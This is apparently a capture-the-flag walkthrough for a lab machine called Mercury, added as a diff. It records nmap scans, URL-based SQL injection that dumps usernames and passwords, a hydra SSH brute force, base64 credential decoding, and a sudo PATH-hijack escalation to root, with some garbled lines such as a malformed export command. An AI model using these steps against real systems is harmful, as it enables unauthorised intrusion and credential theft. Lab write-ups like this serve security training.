@@ -1,0 +1,171 @@
+[*]
+1. Find host: nmap -sn 172.16.16.0/24
+MAC Address: 08:00:27:5C:40:14 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.16.47
+Host is up (0.00034s latency).
+
+
+2. Quick scan: nmap 172.16.16.47
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-10 17:49 CDT
+Nmap scan report for 172.16.16.47
+Host is up (0.00015s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+8080/tcp open  http-proxy
+MAC Address: 08:00:27:B3:5F:43 (Oracle VirtualBox virtual NIC)
+
+3. Background extended scan: nmap -p- -sS -sU 172.16.16.47
+
+
+4. Service scan: nmap 172.16.16.47 -p 22,8080 -A
+2/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http-proxy WSGIServer/0.2 CPython/3.8.2
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Date: Thu, 10 Sep 2020 22:50:35 GMT
+|     Server: WSGIServer/0.2 CPython/3.8.2
+|     Content-Type: text/html
+|     X-Frame-Options: DENY
+|     Content-Length: 2366
+|     X-Content-Type-Options: nosniff
+|     Referrer-Policy: same-origin
+|     <!DOCTYPE html>
+|     <html lang="en">
+|     <head>
+|     <meta http-equiv="content-type" content="text/html; charset=utf-8">
+|     <title>Page not found at /nice ports,/Trinity.txt.bak</title>
+|     <meta name="robots" content="NONE,NOARCHIVE">
+|     <style type="text/css">
+
+
+5.  Checking out /nice ports,/Trinity.txt.bak, it had a reference to /mercuryfacts/
+
+6. While looking at /mercuryfacts/1, i went to /mercuryfacts/0, and noticed a sql like error. I then did /1' or 1=1--
+http://172.16.16.47:8080/mercuryfacts/1%22%20or%201=1--/
+
+I got super verbse SQL error output, possible SQLi? Enumerating more
+(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'='1'
+
+7. SQLi Enumeration. I realized these are just straight up queries
+/1 or 2/
+/1 union select username from users/
+, ('john',), ('laura',), ('sam',), ('webmaster',))
+1 union select password from users/
+'johnny1987',), ('lovemykids111',), ('lovemybeer111',), ('mercuryisthesizeof0.056Earths',))
+
+8. I put user/passcombos in files to bruteforce ssh
+hydra -L users.txt -P password.txt -e nsr ssh://172.16.16.47
+[22][ssh] host: 172.16.16.47   login: webmaster   password: mercuryisthesizeof0.056Earths
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-10 19:14:19
+
+9. Enumerate user: sudo -l
+ebmaster@mercury:~$ sudo -l
+[sudo] password for webmaster: 
+Sorry, user webmaster may not run sudo on mercury.
+
+10. Found artifact: cat user_flag.txt 
+[user_flag_8339915c9a454657bd60ee58776f4ccd]
+
+11. Found another artifact: /mercury_proj$ cat notes.txt 
+Project accounts (both restricted):
+webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
+linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
+
+12. Base64 decode:
+echo 'bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK' | base64 -d
+mercuryisthesizeof0.056Earths
+echo 'bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==' | base64 -d
+mercurymeandiameteris4880km
+
+13. Escalate privs to linuxmaster: su - linuxmaster
+mercurymeandiameteris4880km
+
+14. Enumerate user: sudo -l
+[sudo] password for linuxmaster: 
+Sorry, try again.
+[sudo] password for linuxmaster: 
+Matching Defaults entries for linuxmaster on mercury:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User linuxmaster may run the following commands on mercury:
+    (root : root) SETENV: /usr/bin/check_syslog.sh
+
+15. Check script
+sudo /usr/bin/check_syslog.sh
+Sep 11 00:15:22 mercury systemd[1211]: Listening on GnuPG cryptographic agent and passphrase cache.
+Sep 11 00:15:22 mercury systemd[1211]: Listening on debconf communication socket.
+Sep 11 00:15:22 mercury systemd[1211]: Listening on D-Bus User Message Bus Socket.
+Sep 11 00:15:22 mercury systemd[1211]: Reached target Sockets.
+Sep 11 00:15:22 mercury systemd[1211]: Reached target Basic System.
+Sep 11 00:15:22 mercury systemd[1211]: Reached target Main User Target.
+Sep 11 00:15:22 mercury systemd[1211]: Startup finished in 44ms.
+Sep 11 00:15:22 mercury systemd[1]: Started User Manager for UID 1001.
+Sep 11 00:15:22 mercury systemd[1]: Started Session 4 of user webmaster.
+Sep 11 00:17:01 mercury CRON[1327]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)
+
+16. Check SGUID binaries: find / -perm -4000 2>/dev/null
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/su
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/umount
+/usr/bin/fusermount
+/usr/bin/passwd
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+
+17. Script contents: cat /usr/bin/check_syslog.sh
+#!/bin/bash
+tail -n 10 /var/log/syslog
+
+18. Make a script called tail in your local dir
+cat tail
+#!/bin/bash
+sudo /bin/bash -i
+
+19. reset path to check local first: This just appends current director infront of current $PATH
+export $PATH:.$PATH
+
+20. Call new tail with local $PATH variable:
+sudo PATH=$PATH /usr/bin/check_syslog.sh
+root@mercury:/home/linuxmaster# id
+uid=0(root) gid=0(root) groups=0(root)
+
+21. grab flag: cd; ls
+root_flag.txt
+root@mercury:~# cat root_flag.txt 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@/##////////@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@
+@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@
+@@@@@@@@/#(((#((((((/(/,*/(((///////(/*/*/#@@@@@@@
+@@@@@@*((####((///*//(///*(/*//((/(((//**/((&@@@@@
+@@@@@/(/(((##/*((//(#(////(((((/(///(((((///(*@@@@
+@@@@/(//((((#(((((*///*/(/(/(((/((////(/*/*(///@@@
+@@@//**/(/(#(#(##((/(((((/(**//////////((//((*/#@@
+@@@(//(/((((((#((((#*/((///((///((//////(/(/(*(/@@
+@@@((//((((/((((#(/(/((/(/(((((#((((((/(/((/////@@
+@@@(((/(((/##((#((/*///((/((/((##((/(/(/((((((/*@@
+@@@(((/(##/#(((##((/((((((/(##(/##(#((/((((#((*%@@
+@@@@(///(#(((((#(#(((((#(//((#((###((/(((((/(//@@@
+@@@@@(/*/(##(/(###(((#((((/((####/((((///((((/@@@@
+@@@@@@%//((((#############((((/((/(/(*/(((((@@@@@@
+@@@@@@@@%#(((############(##((#((*//(/(*//@@@@@@@@
+@@@@@@@@@@@/(#(####(###/((((((#(///((//(@@@@@@@@@@
+@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+Congratulations on completing Mercury!!!
+If you have any feedback please contact me at SirFlash@protonmail.com
+[root_flag_69426d9fda579afbffd9c2d47ca31d90]
